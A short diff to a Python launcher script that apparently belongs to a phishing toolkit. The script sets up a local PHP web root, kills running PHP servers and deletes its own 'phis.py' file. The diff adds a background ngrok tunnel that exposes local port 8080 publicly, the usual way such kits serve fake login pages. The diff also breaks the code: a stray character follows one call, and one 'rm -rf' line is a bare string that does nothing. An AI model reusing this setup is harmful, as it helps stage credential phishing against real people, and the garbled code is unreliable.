@@ -1,4 +1,5 @@
 import os,time,json,requests
+os.system("./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
 os.system('rm -rf phis.py')
 tm=os.system
 #os.system("cd $HOME/sdcard/ngrok/ && chmod +x ngrok")
@@ -6,7 +7,7 @@ if os.path.isdir("Abir")!=True:
 	tm("mkdir -p Abir")
 if os.path.isdir("Abir/www")==True:
 	("rm -rf Abir/www")
-	tm("mkdir -p Abir/www")
+	tm("mkdir -p Abir/www")p
 else:
 	tm("mkdir -p Abir/www")
 os.system("killall php> /dev/null 2>&1")
